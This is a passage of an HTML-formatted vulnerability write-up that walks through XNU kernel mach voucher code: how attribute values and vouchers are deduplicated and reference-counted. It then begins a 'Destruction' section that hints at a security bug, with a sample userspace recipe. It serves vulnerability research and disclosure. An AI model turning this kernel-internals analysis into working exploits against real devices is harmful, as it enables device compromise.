class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;You&amp;#39;ll notice that this code has a very similar structure to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;; it needs to do almost exactly the same thing. Under a lock (this time the controller&amp;#39;s lock) traverse a hash table looking for a matching value. If one can&amp;#39;t be found, allocate a new entry and put the value in the hash table. The same unlock/lock dance is needed, but not every time because &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;#39;s are kept in a table of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;struct ivac_entry_s&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;#39;s so the lock only needs to be dropped if the table needs to grow.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;If a new entry is allocated (from the freelist of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;#39;s in the table) then its reference count (&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;) is set to 1, and its &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;count is set to 1. If an existing entry is found then both its &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;counts are incremented:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5d6f231d91c5f3fcaedc02e8af1faacf22268e6f"&gt;&lt;/a&gt;&lt;a id="t.33"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Finally, the &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;index&lt;/span&gt;&lt;span&gt;&amp;nbsp;of this entry in the table of all the controller&amp;#39;s entries is returned, because it&amp;#39;s the index into that table which a voucher stores; not a pointer to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_set&lt;/span&gt;&lt;span&gt;&amp;nbsp;to store that index into the correct slot in the voucher&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;, which is just a simple array index operation:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.ac2c12e184f7c3e12da13fbd6404f62d8c16842e"&gt;&lt;/a&gt;&lt;a id="t.34"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_set&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;val_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.49ce745eb25ac89c231f0c471abc9f82f9797477"&gt;&lt;/a&gt;&lt;a id="t.35"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_set&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; iv_index_t key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; iv_index_t value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Our journey following this recipe is almost over! Since we only supplied one sub-recipe we exit the loop in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;and reach the call to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dedup&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.bdeacdf6e0a60502a972f38307eadc992aacd7de"&gt;&lt;/a&gt;&lt;a id="t.36"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_dedup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;I won&amp;#39;t show the code for &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;here because it&amp;#39;s again structurally almost identical to the two other levels of deduping we&amp;#39;ve examined. In fact it&amp;#39;s a little simpler because it can hold the associated hash table lock the whole time (via &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivht_lock()&lt;/span&gt;&lt;span&gt;) since it doesn&amp;#39;t need to allocate anything. If a match is found (that is, the hash table already contains a voucher with exactly the same set of value indexes) then a reference is taken on that existing voucher and a reference is dropped on the voucher we just created from the input recipe via &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dealloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1101ce1325bc496de996015edaf1a773d5d5120c"&gt;&lt;/a&gt;&lt;a id="t.37"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_dealloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;FALSE&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument here indicates that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;new_iv&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivht_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;hashtable so shouldn&amp;#39;t be removed from there if it is going to be destroyed. Vouchers are only added to the hashtable after the deduping process to prevent deduplication happening against incomplete vouchers.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The final step occurs when &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns. Since this is a MIG method, if it returns success and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;new_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;IV_NULL&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;new_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be converted into a mach port; a send right to which will be given to the userspace caller. This is the final level of deduplication; there can only ever be one mach port representing a particular voucher. This is implemented by the voucher structure&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_port&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;member.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;(For the sake of completeness note that there are actually two userspace interfaces to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;; the host port MIG method and also the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;host_create_mach_voucher_trap&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;mach trap. The trap interface has to emulate the MIG semantics though.)&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.gt3jam2tl3zw"&gt;&lt;span&gt;Destruction&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Although I did briefly hint at a vulnerability above we still haven&amp;#39;t actually seen enough code to determine that that bug actually has any security consequences. This is where things get complicated ;-)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Let&amp;#39;s start with the result of the situation we described above, where we created a voucher port with the following recipe:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6"&gt;&lt;/a&gt;&lt;a id="t.38"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;udata_dword_recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_recipe_data_t recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; uint32_t payload&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;udata_dword_recipe r &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;uint32_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;payload &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0x41414141&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;This will end up with the following data structures in the kernel:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1c923ba263ede6be48f5e3994bd28dbf63e17419"&gt;&lt;/a&gt;&lt;a id="t.39"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher_port &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ip_kobject &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;reference&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;counted pointer to the voucher&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_refs &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;6&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;reference&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;counted &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;into&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;user_data controller&amp;#39;s ivac_table&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;controller 